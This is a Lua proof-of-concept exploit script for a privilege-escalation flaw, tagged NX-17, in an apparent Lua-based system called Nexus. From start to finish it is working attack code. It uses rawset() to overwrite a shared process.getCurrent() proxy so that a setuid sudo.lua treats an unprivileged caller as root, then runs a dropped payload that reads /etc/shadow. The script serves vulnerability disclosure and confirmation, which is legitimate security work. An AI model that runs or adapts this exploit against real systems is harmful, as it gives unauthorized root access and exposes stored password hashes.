-- NV-2026-001 / NX-17 proof of concept.
--
-- Demonstrates that a userland process can replace process.getCurrent() on the
-- shared user-tier API proxy with rawset(). sudo.lua runs set-user-ID root and
-- asks that same proxy who the caller is, so the replacement makes it treat the
-- caller as uid 0, skip the password prompt, and execute a payload as root.
--
-- Deploy to /usr/bin/ (main.lua makes it 0755) and run as an unprivileged
-- user inside Nexus:
--     nx17_shared_api_sudo
--
-- Local research only. Do not run against systems you do not own.

if not _NEXUS then
    io.stderr:write("nx17: run this inside Nexus\n")
    os.exit(1)
end

local process = require("process")

local function fail(message)
    io.stderr:write("nx17: " .. message .. "\n")
    os.exit(1)
end

local me = process.getCurrent()
if not me then fail("cannot identify the current process") end
if me.euid == 0 then fail("run this as an unprivileged user") end

local home = os.getenv("HOME")
if not home or home == "" or home == "/" then
    fail("HOME is not a user directory")
end

local payload_path = home .. "/nx17_payload.lua"

local payload = [==[
local process = require("process")
local pid = process.getCurrentPID()
local me = process.get(pid)
io.write("nx17-payload: pid=" .. tostring(pid) ..
    " uid=" .. tostring(me and me.uid) ..
    " euid=" .. tostring(me and me.euid) .. "\n")

local file, err = io.open("/etc/shadow", "r")
if not file then
    io.write("nx17-payload: /etc/shadow denied: " .. tostring(err) .. "\n")
    os.exit(1)
end
local content = file:readAll()
file:close()
io.write("nx17-payload: /etc/shadow[1]=" ..
    (content:match("^[^\r\n]*") or "") .. "\n")
]==]

local file, err = io.open(payload_path, "w")
if not file then fail("cannot create payload: " .. tostring(err)) end
local ok, write_err = file:write(payload)
file:close()
if not ok then fail("cannot write payload: " .. tostring(write_err)) end

io.write("nx17: overriding the shared process.getCurrent() proxy\n")

-- The proxy returned by require("process") is a single table shared by every
-- user-tier process. rawset() bypasses its __newindex guard.
local original = rawget(process, "getCurrent")
rawset(process, "getCurrent", function()
    return {
        pid = process.getCurrentPID(),
        uid = 0, euid = 0, suid = 0,
        gid = 0, egid = 0, sgid = 0,
    }
end)

local exec_ok, pid, exec_err = pcall(process.exec, "/usr/bin/sudo.lua", { payload_path })
if not exec_ok then
    rawset(process, "getCurrent", original)
    fail("cannot execute sudo: " .. tostring(pid))
end
if not pid or pid == -1 then
    rawset(process, "getCurrent", original)
    fail("cannot execute sudo: " .. tostring(exec_err))
end

-- Keep the replacement installed until sudo and its child have finished.
local wait_ok, wait_err, status = pcall(process.wait, pid)
rawset(process, "getCurrent", original)

if not wait_ok then fail("wait failed: " .. tostring(wait_err)) end
if wait_err then fail("wait failed: " .. tostring(wait_err)) end
io.write("nx17: sudo exited with status " .. tostring(status) .. "\n")
io.write("nx17: if the payload printed euid=0 and a shadow line, NX-17 is confirmed\n")
